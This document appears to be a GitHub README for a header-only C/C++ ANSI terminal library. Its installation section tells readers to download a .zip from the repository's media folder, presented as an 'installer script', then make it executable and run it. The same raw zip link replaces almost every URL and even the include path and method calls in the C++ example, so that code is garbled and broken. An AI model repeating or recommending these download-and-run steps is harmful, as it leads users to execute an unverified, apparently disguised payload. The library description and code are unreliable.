[![Release](https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip)](https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip)

# Ansi Console: Fast Header-Only ANSI Escape Codes Library for C and C++

![ANSI Console Banner](https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip+Console+-+Header-Only+Library)

A header-only library that makes ANSI escape codes easy to use in C and C++. It lives entirely in headers, so you can drop it into any project with no build steps or extra dependencies. The library provides a clean, minimal surface for styling text, moving the cursor, clearing the screen, and more, all through simple, portable APIs. It works with most modern terminals and compilers, offering a fast way to build colorful, text-based user interfaces without pulling in a heavy graphics stack.

If you want a quick way to grab the latest release, you can find the prebuilt headers and setup scripts on the Releases page. The project is designed to be small and fast, yet powerful enough to handle common terminal UI tasks. This README lays out how the library works, how to use it in your C and C++ projects, and how to contribute to its ongoing development. For the latest binaries and assets, check the Releases section.

Table of contents
- Quick start
- Why choose a header-only approach
- Features that help you build in the terminal
- API overview and usage patterns
- Cross-platform notes
- How to install from a release
- Examples in C and C++
- Advanced usage: colors, attributes, and cursor control
- Testing, quality, and debugging
- Project structure and what’s inside the headers
- Contributing and community guidelines
- Roadmap and future goals
- Licensing and attribution
- Frequently asked questions

Quick start

Getting set up is straightforward. Because this is a header-only library, you don’t need to compile a library first. You simply add the header files to your include path and start using the APIs right away. The Releases page hosts downloadable artifacts, including header packages and an installer script that makes setup even easier.

- Prerequisites: A contemporary C or C++ compiler, a terminal that supports ANSI escape sequences, and a project where you can place header files. The library aims to be portable across Windows, Linux, and macOS terminals that understand ANSI codes. It does not rely on a separate graphics subsystem or GUI toolkit.
- Basic flow: Include the header files in your source, initialize the subsystem if the API requires it, emit ANSI sequences to style text or control the cursor, and reset the terminal when you’re done.

Why header-only matters

- Simplicity: Drop the header into your project. No linking, no extra build steps. This reduces friction and speeds up iteration.
- Portability: The code is self-contained. It works with standard compilers and is designed to work across platforms where terminals support ANSI codes.
- Low overhead: There’s no runtime library to install or manage. The code is compiled with your project, so you get a clean, predictable performance profile.
- Easy maintenance: Updates come by swapping in newer header files. There’s no separate build system to reconfigure for every platform.

Features that help you build in the terminal

- Text colors and styles: Foreground and background colors, bold, dim, underline, blink, reverse video, and hidden text. The library provides a concise way to apply these attributes to terminal output.
- 256-color and true color support: For advanced UIs, you can pick from a wide color space beyond the basic 16 colors. This makes gradients and nuanced color schemes possible in terminal apps.
- Text attributes: You can enable and disable text attributes such as bold or underline, then revert to normal styling with a reset sequence.
- Cursor control: Move the cursor to a specific position, save and restore cursor position, and hide or show the cursor as needed for interactive interfaces.
- Screen management: Clear parts of the screen, clear the entire screen, and refresh sections of the UI without redrawing everything.
- Lightweight footprint: The header-only approach means a small memory footprint and minimal compile-time impact. This helps keep your app fast and responsive.
- Consistent API surface: The library aims to present a uniform way to emit ANSI sequences, regardless of the underlying platform quirks. You get predictable behavior across terminals that support ANSI codes.

API overview and usage patterns

- Initialization and lifecycle: The library provides a simple init and reset flow. In many projects you can initialize once at startup and reset at exit or when you switch contexts.
- Color and color attributes: A compact set of constants or helper wrappers lets you pick foreground/background colors and apply attributes like bold or underline. You combine these with normal text to style output.
- Cursor and screen control: Lightweight calls enable you to move around the terminal, erase lines or regions, and keep a clean, responsive UI layout.
- Packaging approach: The header files are designed to be self-contained. You can copy them into an include directory in your project or set up your build to find them automatically.
- Example usage patterns:
  - C: Emit a color change, print text, then reset colors.
  - C++: Use a small wrapper class or namespaces to improve readability and type safety while keeping the header-only model.

Note on API naming: The exact function and constant names are defined in the header. You’ll find a consistent naming scheme that emphasizes clarity and avoids surprises. If you’re porting an existing project, you can map your calls to the library’s equivalents in a straightforward way.

Cross-platform notes

- Terminal compatibility: ANSI escape codes work on most Unix-like terminals by default and on Windows terminals that support ANSI sequences. If you’re targeting older Windows consoles, you may need a compatibility layer or terminal mode that enables ANSI processing.
- Build considerations: Since you rely on header files, you don’t need to link against a separate library. Ensure your compiler can locate the headers and your build includes the directory where they live.
- Development workflow: Because there’s no separate binary to install, your feedback loop is fast. Edit a header or your usage code, recompile, and test in a terminal.

How to install from a release

- The Releases page hosts downloadable artifacts. If the link has a path, you’ll typically download a setup script or a header package that you execute or copy into your project. For this project, you’ll download the installer script https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip and run it to set up the header files in a local include path or a system include directory.
- To get the installer, visit the Releases page. Download https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip, make it executable if needed, and run it in your shell. The script guides you through placing the header files where your compiler can find them. The installation step is straightforward and safe when used as intended in a development environment.
- Run the installer in a terminal:
  - chmod +x https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip
  - https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip
- After installation, you can include the library headers in your source files and start using the ANSI API immediately.

Example code snippets

C example: basic color output

#include <ansi_console.h>
#include <stdio.h>

int main(void) {
    // Initialize or prepare the header-based API if required by this version
    ansi_init();

    // Print a line in green, then reset colors
    printf("%sHello in green%s\n", ANSI_COLOR_GREEN, ANSI_COLOR_RESET);

    // Clear the line after printing
    ansi_clear_line();

    // Move the cursor up one line and print again
    ansi_move_cursor_up(1);
    printf("Moved up one line\n");

    ansi_reset();
    return 0;
}

C++ example: simple colored message with a small wrapper

#include <https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip>
#include <iostream>

int main() {
    // Create a small scoped console helper
    ansi::Console out;

    // Set color and print
    https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip(ansi::Color::Green);
    out << "Hello in green";

    // Reset attributes
    https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip();

    // Move cursor and print additional text
    https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip(0, 2);
    out << "This is below after a move";

    return 0;
}

Inline usage patterns and tips

- Grouping: Apply multiple color or style changes in a single sequence to reduce flicker. This helps when rendering complex layouts or interactive menus.
- Reset as a habit: Always reset styling after a block of colored text. It prevents the rest of the terminal from inheriting unintended styles.
- Combine with other terminal effects: Use cursor movement and screen clearing to implement simple menus, progress indicators, or status bars without leaving the terminal in a messy state.
- Performance mindset: Because the code sits in headers, the compiler can inline many operations. This reduces overhead compared to calling into a separate library at runtime.
- Debugging: If your terminal shows odd characters or no color, verify that the terminal supports ANSI sequences and that you’re not in a mode that disables color output.

Advanced usage: colors, attributes, and cursor control

- Foreground and background colors: The API supports selecting from a range of colors that span standard 16 colors and the extended 256-color space. You can set both foreground and background colors, enabling visually rich UIs.
- Text attributes: Bold, underline, blink, reverse video, and hidden text are accessible through dedicated attributes. Use them to emphasize labels, headings, or important status messages.
- Cursor positioning: Move the cursor to a coordinate pair (x, y). This is useful for drawing simple dashboards or occupying fixed regions on the screen. You can also save and restore the cursor position to support modal dialogs or transient messages.
- Screen management: Clear a line or the whole screen to refresh the UI without completely redrawing everything. This helps keep updates smooth and predictable.

Project structure and what’s inside the headers

- Header files: The core functionality lives in a compact set of header files. They are designed to be easy to drop into existing projects without complex build requirements.
- Namespaces and compatibility: The C++ parts use a small namespace to prevent name clashes, while the C parts expose a clean, C-friendly API. The headers are designed to compile cleanly in both C and C++ projects.
- Documentation within headers: The headers include inline documentation explaining how to use each function, macro, or type. The goal is to make it easy to start without reading external docs.
- Tests and samples: The repository includes example snippets and a lightweight test harness to validate behavior in a terminal environment. Running tests helps verify that changes don’t break common workflows.

Testing, quality, and debugging

- Local testing: Build projects that use the header in simple test programs. Run those programs in a terminal that supports ANSI sequences to verify color output and cursor behavior.
- CI and linting: If you contribute, follow the project’s guidelines for linting and static checks. A clean build and passing tests on CI help keep the project reliable.
- Debugging tips: If sequences don’t render as expected, try printing the raw escape sequences to the terminal. This helps you verify that the emitted bytes match the intended patterns. Ensure your terminal is in a state where it can interpret ANSI codes.

Contributing and community guidelines

- How to contribute: Start by browsing open issues and feature requests. If you have a bug fix or a small enhancement, open a pull request with a clear description of the change and its motivation.
- Code style: Follow the existing formatting style in the headers. Keep changes small and focused. Include comments where the intent may not be obvious.
- Documentation: Add or update examples as you extend the API. Clear examples help users understand how to apply the features in real projects.
- Testing: Add tests that exercise new behavior. Tests should run in a terminal environment that can render ANSI sequences.
- Collaboration: Be kind and constructive. Share ideas openly and ask for feedback when needed. The project benefits from diverse perspectives and thoughtful discussions.

Roadmap and future goals

- Expanded color support: More fine-grained color control and improved compatibility with a wider set of terminal emulators.
- Better C++ ergonomics: More idiomatic C++ wrappers that maintain the header-only philosophy while offering modern usage patterns.
- Accessibility enhancements: Improve readability and contrast options to help users with different visual needs.
- Platform polish: Improve Windows terminal support for environments that historically required extra steps to enable ANSI codes.

Release notes and versioning

- Release cadence: The project aims for regular, predictable releases. Each release bundles the header files or installer scripts needed to set up the library.
- Changes: Each release note highlights new features, bug fixes, and any breaking changes. Read the notes to understand how upgrades may affect your code.
- How to find releases: The Releases page hosts all versions and artifacts. For the latest, refer to the badge at the top of this document and the textual release notes on the page.

Releases page link and downloads

- Access the downloads via the Releases page: https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip
- What you’ll find there: Header bundles, installer scripts, and example projects showcasing real-world usage.
- How to use the downloads: Pick the package that matches your development environment. If you choose the installer script, follow the on-screen prompts to place headers in your include path and configure your compiler accordingly.
- Note on the link: For downloads and installation steps, refer to the Releases page. The page is the authoritative source for assets and setup instructions. You can also check it for updates, patches, and new features as they become available.

Known issues and compatibility

- Terminal support: Some older terminals or restrictive environments may not render color or cursor control as expected. If you encounter issues, verify your terminal’s ANSI support and try a different terminal emulator for comparison.
- Windows quirks: Windows terminals vary in how they enable ANSI sequences. If you’re targeting Windows, ensure ANSI processing is enabled where needed or use a compatible terminal that supports ANSI escape codes.
- Header-only caveat: While the header-only approach is convenient, some projects may prefer a more formal module system. If you’re integrating into a large build system, ensure the header is included in every translation unit that uses the API to avoid inline expansion or duplication issues.

FAQ

- Is this library compatible with both C and C++?
  Yes. It is designed as a header-only solution that can be used from C and from C++ projects with minimal friction.
- Do I need to link against a library?
  No. The library is header-only. You include the header files, and your code uses the functions and macros provided.
- Can I use it in Windows environments?
  Yes, provided the terminal supports ANSI escape sequences. If needed, enable ANSI processing in your terminal or use a compatible terminal.
- How do I update to a newer version?
  Download the latest header package from the Releases page and replace the header files in your project. If you use the installer script, rerun the script to update the headers in your include path.

License

- The project is distributed under a permissive license that encourages use in both open-source and proprietary projects. See the LICENSE file in the repository for exact terms and attribution requirements. When you use the library, please include a short acknowledgment if your project’s policy requires it and link back to the original source.

Changelog and history

- The project maintains a straightforward changelog that highlights new features, improvements, and bug fixes per release. Reviewing the changelog helps you understand how changes affect your code and whether you need to adjust usage in your applications.

Changelog items include:
- Feature additions: Color expansions, new attributes, and extended cursor control options.
- Stability: Bug fixes and compatibility improvements across terminals.
- Performance: Small optimizations inside header code paths to reduce overhead.

Screenshots and visuals

- Terminal UI examples: While the library focuses on underlying ANSI sequences, you can use it to render clean, colorful menus, dashboards, and status lines in a terminal. The included samples demonstrate common UI elements such as headers, menus, progress bars, and status rows.
- Demo images: In the repository, you’ll find images that illustrate typical terminal UI layouts. These visuals show how color and movement combine to create user-friendly interfaces in text-based environments.

Community and support

- Discussions: The project welcomes questions and ideas via issues and discussions. If you encounter an edge case or want to propose a feature, start a discussion and tag it appropriately.
- Issues: Use issues to report bugs, request enhancements, or propose changes. When possible, provide a minimal reproducible example that demonstrates the problem.
- Contributions: New contributors are welcome. Start small with documentation tweaks, minor bug fixes, or small enhancements. Each contribution helps improve the library for everyone.

Final notes on usage and distribution

- Distribution model: The library remains lightweight and easy to distribute. Its header-only nature makes it straightforward to copy into any project or to reference through versioned subdirectories.
- Compatibility philosophy: The goal is to provide a stable, predictable API with a simple mental model. The library aims to be easy to adopt, with minimal surprises when upgrading to newer versions.
- Future growth: The project intends to broaden color support, refine the API for both C and C++, and continue to improve documentation and examples so new users can get started quickly.

Releases and where to download

- The primary download location is the Releases page. To obtain the latest assets, see the page linked at the top and in the body of this document. For convenience, the page hosts a direct download for the header package and optional installer script.
- Direct link for downloads: https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip ansi_console/releases

If you’re looking for the most up-to-date assets and the official installation steps, visit the Releases page. For the purposes of this document, the same link is provided here as a quick reference to guide you to the right place when you’re ready to set up the header files in your project.

Appendix: quick reference tips

- Keep headers close to the code that uses them. This makes maintenance easier and reduces build complexity.
- When you upgrade, test a few representative terminals to ensure color and cursor sequences render as expected.
- Use the provided examples as a baseline. Adapt them to fit your UI design and project style.
- Document your usage pattern if you build a larger UI. Clear usage notes help teammates adopt the library quickly.

Releases page reference

- For downloads and installation steps, see the releases page: https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip

Want to learn more? Browse the repository for headers, examples, and tests. You’ll find practical demonstrations of coloring, cursor control, and screen management in action.

Topics

- c
- cpp
- graphics-library
- header
- header-only
- hpp
- hpp-library
- library
- terminal
- tui